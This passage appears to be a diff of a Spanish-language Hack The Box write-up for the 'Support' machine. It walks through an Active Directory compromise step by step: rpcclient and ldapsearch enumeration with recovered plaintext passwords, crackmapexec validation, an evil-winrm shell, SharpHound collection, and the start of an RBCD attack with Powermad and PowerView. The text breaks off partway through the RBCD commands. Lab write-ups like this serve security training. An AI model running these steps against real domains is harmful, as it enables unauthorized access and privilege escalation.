+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;rpcclient &lt;span class=&quot;nt&quot;&gt;-U&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'ldap%nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz'&lt;/span&gt; 10.10.11.174 &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'querygroupmem 0x200'&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;	rid:[0x1f4] attr:[0x7]
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h3 id=&quot;descripción-usuario-administrator&quot;&gt;DESCRIPCIÓN USUARIO ADMINISTRATOR&lt;/h3&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;rpcclient &lt;span class=&quot;nt&quot;&gt;-U&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'ldap%nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz'&lt;/span&gt; 10.10.11.174 &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'queryuser 0x1f4'&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;User Name   :	Administrator
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;ldapsearch-ad-enum-with-creds&quot;&gt;LDAPSEARCH AD ENUM (WITH CREDS)&lt;/h2&gt;
+
+&lt;p&gt;Continuamos enumerando el directorio activo, en este caso con la utilidad &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ldapsearch&lt;/code&gt;, encontrando una credencial en el campo &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;info&lt;/code&gt; perteneciente al usuario &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;support&lt;/code&gt;&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ldapsearch &lt;span class=&quot;nt&quot;&gt;-x&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-H&lt;/span&gt; ldap://10.10.11.174 &lt;span class=&quot;nt&quot;&gt;-D&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'ldap@support.htb'&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-w&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz'&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-b&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;DC=support,DC=htb&quot;&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;grep&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'samaccountname: support'&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-B&lt;/span&gt; 40
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;info: Ironside47pleasure40Watchful
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;validating-support-creds&quot;&gt;VALIDATING SUPPORT CREDS&lt;/h2&gt;
+
+&lt;p&gt;Vamos a validar las credenciales del usuario &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;support&lt;/code&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;validar-creds-smb-1&quot;&gt;VALIDAR CREDS SMB&lt;/h3&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;crackmapexec smb 10.10.11.174 &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; users.txt &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'Ironside47pleasure40Watchful'&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--continue-on-success&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;SMB         10.10.11.174    445    DC               &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] support.htb&lt;span class=&quot;se&quot;&gt;\s&lt;/span&gt;upport:Ironside47pleasure40Watchful
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h3 id=&quot;validar-creds-winrm-1&quot;&gt;VALIDAR CREDS WINRM&lt;/h3&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;crackmapexec winrm 10.10.11.174 &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; support &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'Ironside47pleasure40Watchful'&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;SMB         10.10.11.174    5985   DC               &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Windows 10.0 Build 20348 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;name:DC&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;domain:support.htb&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+HTTP        10.10.11.174    5985   DC               &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; http://10.10.11.174:5985/wsman
+WINRM       10.10.11.174    5985   DC               &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] support.htb&lt;span class=&quot;se&quot;&gt;\s&lt;/span&gt;upport:Ironside47pleasure40Watchful &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Pwn3d!&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Tenemos credenciales con privilegios para conectarnos de manera remota&lt;/p&gt;
+
+&lt;h2 id=&quot;granted-access-support-user&quot;&gt;GRANTED ACCESS SUPPORT USER&lt;/h2&gt;
+
+&lt;p&gt;Accedemos a la máquina víctima con &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;evil-winrm&lt;/code&gt;&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;evil-winrm &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; 10.10.11.174 &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'support'&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'Ironside47pleasure40Watchful'&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;whoami&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;support&lt;span class=&quot;se&quot;&gt;\s&lt;/span&gt;upport
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;ad-enum-local&quot;&gt;AD ENUM LOCAL&lt;/h2&gt;
+
+&lt;p&gt;Nos encontramos dentro de la máquina víctima, sin embargo, necesitamos escalar privilegios, por lo tanto, debemos enumerar la máquina para obtener más información que nos pueda ayudar.&lt;/p&gt;
+
+&lt;h3 id=&quot;usuarios-de-la-máquina&quot;&gt;USUARIOS DE LA MÁQUINA&lt;/h3&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;net user
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nt&quot;&gt;-------------------------------------------------------------------------------&lt;/span&gt;
+Administrator            anderson.damian          bardot.mary
+cromwell.gerard          daughtler.mabel          ford.victoria
+Guest                    hernandez.stanley        krbtgt
+langley.lucy             ldap                     levine.leopoldo
+monroe.david             raven.clifton            smith.rosario
+stoll.rachelle           support                  thomas.raphael
+west.laura               wilson.shelby
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h3 id=&quot;grupos-y-privilegios-del-usuario-actual&quot;&gt;GRUPOS Y PRIVILEGIOS DEL USUARIO ACTUAL&lt;/h3&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;whoami&lt;/span&gt; /priv
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Privilege Name                Description                    State
+&lt;span class=&quot;o&quot;&gt;=============================&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==============================&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=======&lt;/span&gt;
+SeMachineAccountPrivilege     Add workstations to domain     Enabled
+SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
+SeIncreaseWorkingSetPrivilege Increase a process working &lt;span class=&quot;nb&quot;&gt;set &lt;/span&gt;Enabled
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h3 id=&quot;información-general-de-un-grupo-local&quot;&gt;INFORMACIÓN GENERAL DE UN GRUPO LOCAL&lt;/h3&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;net localgroup &lt;span class=&quot;s2&quot;&gt;&quot;Remote Management Users&quot;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;support
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;bloodhound-enum&quot;&gt;BLOODHOUND ENUM&lt;/h2&gt;
+
+&lt;p&gt;Ahora vamos a descargar y transmitir el binario &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SharpHound.ps1&lt;/code&gt; a la máquina víctima para extraer la información del AD y posteriormente visualizarla en &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;bloodhound&lt;/code&gt;.&lt;/p&gt;
+
+&lt;h4 id=&quot;máquina-atacante&quot;&gt;MÁQUINA ATACANTE&lt;/h4&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;wget https://github.com/BloodHoundAD/SharpHound/releases/download/v1.1.0/SharpHound-v1.1.0.zip
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;mkdir &lt;/span&gt;SharpHound
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;cd &lt;/span&gt;SharpHound
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;mv&lt;/span&gt; ~/Descargas/SharpHound-v1.1.0.zip &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;unzip SharpHound-v1.1.0.zip
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h4 id=&quot;máquina-víctima&quot;&gt;MÁQUINA VÍCTIMA&lt;/h4&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;cd &lt;/span&gt;C:&lt;span class=&quot;se&quot;&gt;\W&lt;/span&gt;indows&lt;span class=&quot;se&quot;&gt;\T&lt;/span&gt;emp
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;mkdir &lt;/span&gt;privs
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;cd &lt;/span&gt;privs
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;upload /opt/BloodHound-linux-x64/SharpHound.exe
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;.&lt;span class=&quot;se&quot;&gt;\S&lt;/span&gt;harpHound.exe &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; All
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;download C:&lt;span class=&quot;se&quot;&gt;\W&lt;/span&gt;indows&lt;span class=&quot;se&quot;&gt;\T&lt;/span&gt;emp&lt;span class=&quot;se&quot;&gt;\p&lt;/span&gt;rivs&lt;span class=&quot;se&quot;&gt;\2&lt;/span&gt;0220718205025_BloodHound.zip bloodhound.zip
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h3 id=&quot;bloodhound-interaction&quot;&gt;BLOODHOUND INTERACTION&lt;/h3&gt;
+
+&lt;p&gt;Ya tenemos la información descargada en nuestro equipo, ahora procedemos a revisar la data con &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;bloodhound&lt;/code&gt;&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;neo4j console &amp;amp;&amp;gt;/dev/null &amp;amp; &lt;span class=&quot;nb&quot;&gt;disown&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;bloodhound &amp;amp;&amp;gt;/dev/null &amp;amp; &lt;span class=&quot;nb&quot;&gt;disown&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# INGRESAR CREDENCIALES DE ACCESO&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h4 id=&quot;seguir-secuencia-en-bloodhound&quot;&gt;SEGUIR SECUENCIA EN BLOODHOUND&lt;/h4&gt;
 &lt;blockquote&gt;
 
-  &lt;ul&gt;
-    &lt;li&gt;Clic en la &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;máquina&lt;/code&gt;&lt;/li&gt;
-    &lt;li&gt;Clic en &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Configuración&lt;/code&gt;&lt;/li&gt;
-    &lt;li&gt;Clic en &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Red&lt;/code&gt;&lt;/li&gt;
-    &lt;li&gt;Clic en &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Adaptador 2&lt;/code&gt;&lt;/li&gt;
-    &lt;li&gt;Clic en &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Enable Network Adapter&lt;/code&gt;&lt;/li&gt;
-    &lt;li&gt;Escoger &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Adaptador sólo-anfitrión&lt;/code&gt;&lt;/li&gt;
-    &lt;li&gt;Escoger &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Interfaz creada&lt;/code&gt;&lt;/li&gt;
-    &lt;li&gt;Clic en &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Aceptar&lt;/code&gt;&lt;/li&gt;
-  &lt;/ul&gt;
+  &lt;p&gt;Upload Data &amp;gt; bloodhound.zip &amp;gt; Analysis &amp;gt; Find all domain admins
+                      &amp;gt; Find Principals with DCSync Rights &amp;gt; Domaim&lt;/p&gt;
+
+&lt;/blockquote&gt;
+
+&lt;h4 id=&quot;enumerar-grupos&quot;&gt;ENUMERAR GRUPOS&lt;/h4&gt;
+&lt;blockquote&gt;
+
+  &lt;p&gt;Buscar Shared support accounts&amp;gt; node info &amp;gt; Reachable High Value Targets&lt;/p&gt;
+
+&lt;/blockquote&gt;
+
+&lt;h4 id=&quot;marcar-usuarios-pwned&quot;&gt;MARCAR USUARIOS PWNED&lt;/h4&gt;
+&lt;blockquote&gt;
+
+  &lt;p&gt;Buscar user &amp;gt; mark user as owned&lt;/p&gt;
+
+&lt;/blockquote&gt;
+
+&lt;h4 id=&quot;escalamiento&quot;&gt;ESCALAMIENTO&lt;/h4&gt;
+&lt;blockquote&gt;
+
+  &lt;p&gt;Node info &amp;gt; Reachable High Value Targets&lt;/p&gt;
 
 &lt;/blockquote&gt;
 
 &lt;p align=&quot;center&quot;&gt;
-&lt;img src=&quot;/assets/images/safewebheaders/10-virtual.png&quot; /&gt;
+&lt;img src=&quot;/assets/images/support/06-blood.png&quot; /&gt;
 &lt;/p&gt;
 
-&lt;h2 id=&quot;configuración-máquina-3&quot;&gt;CONFIGURACIÓN MÁQUINA 3&lt;/h2&gt;
+&lt;h2 id=&quot;resorce-based-constrained-delegation-rbcd-attack&quot;&gt;RESORCE BASED CONSTRAINED DELEGATION (RBCD) ATTACK&lt;/h2&gt;
 
-&lt;p&gt;Nuestra tercera máquina tendrá conexión directa con la interfaz creada, por lo tanto, solo requerimos de un adaptador de red en adaptador sólo-anfitrión.&lt;/p&gt;
-&lt;blockquote&gt;
+&lt;p&gt;Vamos a realizar un &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;RBCD ATTACK&lt;/code&gt;, esto es posible porque el grupo &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SHARED SUPPORT ACCOUNTS&lt;/code&gt; tiene permisos &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Generic all&lt;/code&gt; sobre el &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;AD&lt;/code&gt;, dando la libertad de ejecutar en este caso la posibilidad de crear una nueva cuenta de máquina, que puedes hacer uso del mismo para obtener un ticket impersonando el usuario obteniendo accesos privilegiados con ayuda de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;powermad&lt;/code&gt; y &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;powerview&lt;/code&gt;&lt;/p&gt;
 
-  &lt;ul&gt;
-    &lt;li&gt;Clic en la &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;máquina&lt;/code&gt;&lt;/li&gt;
-    &lt;li&gt;Clic en &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Configuración&lt;/code&gt;&lt;/li&gt;
-    &lt;li&gt;Clic en &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Red&lt;/code&gt;&lt;/li&gt;
-    &lt;li&gt;Clic en &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Adaptador 2&lt;/code&gt;&lt;/li&gt;
-    &lt;li&gt;Clic en &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Enable Network Adapter&lt;/code&gt;&lt;/li&gt;
-    &lt;li&gt;Escoger &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Adaptador sólo-anfitrión&lt;/code&gt;&lt;/li&gt;
-    &lt;li&gt;Escoger &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Interfaz creada&lt;/code&gt;&lt;/li&gt;
-    &lt;li&gt;Clic en &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Aceptar&lt;/code&gt;&lt;/li&gt;
-  &lt;/ul&gt;
+&lt;h3 id=&quot;máquina-atacante-1&quot;&gt;MÁQUINA ATACANTE&lt;/h3&gt;
 
-&lt;/blockquote&gt;
+&lt;h5 id=&quot;descargar-powermadps1-y-powerviewps1&quot;&gt;DESCARGAR POWERMAD.PS1 Y POWERVIEW.PS1&lt;/h5&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;wget https://raw.githubusercontent.com/Kevin-Robertson/Powermad/master/Powermad.ps1
+wget https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h3 id=&quot;máquina-víctima-1&quot;&gt;MÁQUINA VÍCTIMA&lt;/h3&gt;
+
+&lt;h5 id=&quot;transferir-powermad&quot;&gt;TRANSFERIR POWERMAD&lt;/h5&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;upload /home/bast1ant1c/Desktop/bast1ant1c/HTB/AD/easy/support/recon/Powermad.ps1
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;h5 id=&quot;importar-modulo&quot;&gt;IMPORTAR MODULO&lt;/h5&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Import-Module .&lt;span class=&quot;se&quot;&gt;\P&lt;/span&gt;owermad.ps1
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;h5 id=&quot;crear-cuenta-de-máquina&quot;&gt;CREAR CUENTA DE MÁQUINA&lt;/h5&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;New-MachineAccount &lt;span class=&quot;nt&quot;&gt;-MachineAccount&lt;/span&gt; SERVICEA &lt;span class=&quot;nt&quot;&gt;-Password&lt;/span&gt; &lt;span class=&quot;si&quot;&gt;$(&lt;/span&gt;ConvertTo-SecureString &lt;span class=&quot;s1&quot;&gt;'password123'&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-AsPlainText&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-Force&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-Verbose&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h5 id=&quot;transferir-powerview&quot;&gt;TRANSFERIR POWERVIEW&lt;/h5&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;upload /home/bast1ant1c/Desktop/bast1ant1c/HTB/AD/easy/support/recon/PowerView.ps1
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;h5 id=&quot;importar-modulo-1&quot;&gt;IMPORTAR MODULO&lt;/h5&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Import-Module .&lt;span class=&quot;se&quot;&gt;\P&lt;/span&gt;owerView.ps1
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;h5 id=&quot;crear-condiciones-de-la-cuenta-de-máquina-para-explotación&quot;&gt;CREAR CONDICIONES DE LA CUENTA DE MÁQUINA PARA EXPLOTACIÓN&lt;/h5&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Get-DomainComputer SERVICEA
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ComputerSid&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; Get-DomainComputer SERVICEA &lt;span class=&quot;nt&quot;&gt;-Properties&lt;/span&gt; objectsid | Select &lt;span class=&quot;nt&quot;&gt;-Expand&lt;/span&gt; objectsid
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$SD&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; New-Object Security.AccessControl.RawSecurityDescriptor &lt;span class=&quot;nt&quot;&gt;-ArgumentList&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$ComputerSid&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;)&quot;&lt;/span&gt;
